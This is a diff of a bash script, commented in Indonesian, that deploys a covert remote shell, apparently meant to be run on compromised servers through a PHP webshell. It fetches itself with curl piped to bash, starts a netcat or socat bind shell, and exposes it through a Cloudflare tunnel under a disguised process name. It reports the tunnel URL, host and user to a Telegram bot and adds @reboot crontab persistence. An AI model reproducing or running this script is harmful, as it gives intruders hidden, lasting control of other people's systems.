@@ -1,9 +1,9 @@
 #!/usr/bin/env bash
-# Cloudflare Tunnel Reverse Shell - One-liner deploy via PHP webshell
-# Usage (from PHP): system('bash -c "$(curl -fsSL https://raw.githubusercontent.com/VampXDH/Ocean-Shell/refs/heads/main/deploy.sh)"');
-# Uninstall: GS_UNDO=1 bash -c "$(curl -fsSL ...)"
+# Cloudflare Tunnel Reverse Shell (like gsocket)
+# Usage: bash -c "$(curl -fsSL https://raw.githubusercontent.com/VampXDH/Ocean-Shell/refs/heads/main/deploy.sh)"
+# Uninstall: GS_UNDO=1 bash -c "$(curl -fsSL https://raw.githubusercontent.com/VampXDH/Ocean-Shell/refs/heads/main/deploy.sh)"
 
-# Konfigurasi
+# ---------- Konfigurasi ----------
 : "${HOME:=/tmp}"
 : "${USER:=$(whoami 2>/dev/null || echo unknown)}"
 : "${UID:=$(id -u 2>/dev/null || echo 0)}"
@@ -19,13 +19,11 @@ URL_BASE="https://github.com/cloudflare/cloudflared/releases/latest/download"
 TMPDIR="/tmp/.cf-${UID}"
 PORT=$((RANDOM % 40000 + 10000))
 
-set -euo pipefail
-
 # ---------- Fungsi ----------
-log() { echo -e "[*] $*" >&2; }
-err()  { echo -e "[!] $*" >&2; exit 1; }
+log() { echo "[*] $*" >&2; }
+err()  { echo "[!] $*" >&2; exit 1; }
 
-# Kirim pesan ke Telegram
+# Kirim ke Telegram (opsional)
 send_tg() {
     local url="$1"
     local msg="✅ Reverse shell: ${url}%0AHost: $(hostname)%0AUser: ${USER}%0APort: ${PORT}"
@@ -33,11 +31,14 @@ send_tg() {
         -d "chat_id=${TG_CHATID}&text=${msg}" >/dev/null 2>&1 || true
 }
 
-# Deteksi arsitektur
 detect_arch() {
     local arch=$(uname -m)
     local os=$(uname -s | tr '[:upper:]' '[:lower:]')
-    [[ "$os" == "linux" ]] || [[ "$os" == "darwin" ]] || err "Unsupported OS: $os"
+    case "$os" in
+        linux)  os="linux" ;;
+        darwin) os="darwin" ;;
+        *)      err "Unsupported OS: $os" ;;
+    esac
     case "$arch" in
         x86_64|amd64) echo "linux-amd64" ;;
         aarch64|arm64) echo "linux-arm64" ;;
@@ -47,7 +48,6 @@ detect_arch() {
     esac
 }
 
-# Download cloudflared
 download_cf() {
     local arch="$1"
     local url="${URL_BASE}/cloudflared-${arch}"
@@ -58,7 +58,6 @@ download_cf() {
     echo "$out"
 }
 
-# Jalankan bind shell (socat/ncat/nc)
 start_bindshell() {
     local port="$1"
     local cmd
@@ -75,16 +74,18 @@ start_bindshell() {
     echo $!
 }
 
-# Jalankan tunnel (tersembunyi) dan tangkap URL
 start_tunnel() {
     local port="$1"
     local bin="$2"
     local url_file="$3"
+    # Jalankan tunnel dengan nama tersembunyi
     ( exec -a "$PROC_NAME" "$bin" tunnel --url "tcp://localhost:${port}" ) 2>&1 | while IFS= read -r line; do
         if [[ "$line" =~ https://([a-z0-9-]+)\.trycloudflare\.com ]]; then
             url="${BASH_REMATCH[0]}"
             echo "$url" > "$url_file"
-            echo -e "\n✅ TUNNEL URL: $url" >&2
+            # CETAK KE STDOUT (agar langsung terlihat)
+            echo "$url"
+            # Kirim juga ke Telegram
             send_tg "$url"
         fi
         echo "$line" >> "$TMPDIR/cloudflared.log"
@@ -92,7 +93,6 @@ start_tunnel() {
     echo $!
 }
 
-# Pasang persistence via crontab
 install_persistence() {
     local bin_path="$1"
     local port="$2"
@@ -101,7 +101,7 @@ install_persistence() {
     cat > "$script_path" <<EOF
 #!/bin/bash
 while true; do
-    exec -a "$PROC_NAME" "$bin_path" tunnel --url "tcp://localhost:${port}" 2>&1 | while IFS= read -r line; do
+    ( exec -a "$PROC_NAME" "$bin_path" tunnel --url "tcp://localhost:${port}" ) 2>&1 | while IFS= read -r line; do
         if [[ "\$line" =~ https://([a-z0-9-]+)\.trycloudflare\.com ]]; then
             url="\${BASH_REMATCH[0]}"
             echo "\$url" > "$TMPDIR/tunnel.url"
@@ -114,13 +114,11 @@ while true; do
 done
 EOF
     chmod 755 "$script_path"
-    # Hapus entri lama lalu tambah baru
-    crontab -l 2>/dev/null | grep -v "cf_tunnel.sh" | crontab - 2>/dev/null || true
-    (crontab -l 2>/dev/null; echo "@reboot $script_path") | crontab - 2>/dev/null || true
+    # Pasang ke crontab (reboot)
+    (crontab -l 2>/dev/null | grep -v "cf_tunnel.sh"; echo "@reboot $script_path") | crontab - 2>/dev/null || true
     log "Persistence via crontab installed."
 }
 
-# Uninstall
 uninstall() {
     log "Uninstalling..."
     pkill -f "$BIN_NAME" 2>/dev/null || true
@@ -144,29 +142,24 @@ sleep 1
 rm -rf "$TMPDIR" 2>/dev/null || true
 mkdir -p "$TMPDIR"
 
-# Download binary
 arch=$(detect_arch)
 cf_bin=$(download_cf "$arch")
 
-# Pindahkan ke direktori persisten
 INSTALL_DIR="${HOME}/${CONFIG_DIR}"
 mkdir -p "$INSTALL_DIR"
 cp "$cf_bin" "$INSTALL_DIR/$BIN_NAME"
 chmod 755 "$INSTALL_DIR/$BIN_NAME"
 cf_bin="$INSTALL_DIR/$BIN_NAME"
 
-# Start bind shell
 log "Starting bind shell on port $PORT..."
 bind_pid=$(start_bindshell "$PORT")
 sleep 1
 
-# Start tunnel
 log "Starting Cloudflare tunnel..."
 url_file="$TMPDIR/tunnel.url"
 tunnel_pid=$(start_tunnel "$PORT" "$cf_bin" "$url_file")
 sleep 5
 
-# Tampilkan URL (jika berhasil)
 if [[ -f "$url_file" ]]; then
     url=$(cat "$url_file")
     log "Tunnel URL: $url"
@@ -174,7 +167,6 @@ else
     log "Failed to get tunnel URL. Check $TMPDIR/cloudflared.log"
 fi
 
-# Install persistence (opsional, set GS_NOINST=1 untuk skip)
 [[ -z "${GS_NOINST:-}" ]] && install_persistence "$cf_bin" "$PORT"
 
 log "Done. Use GS_UNDO=1 to uninstall."
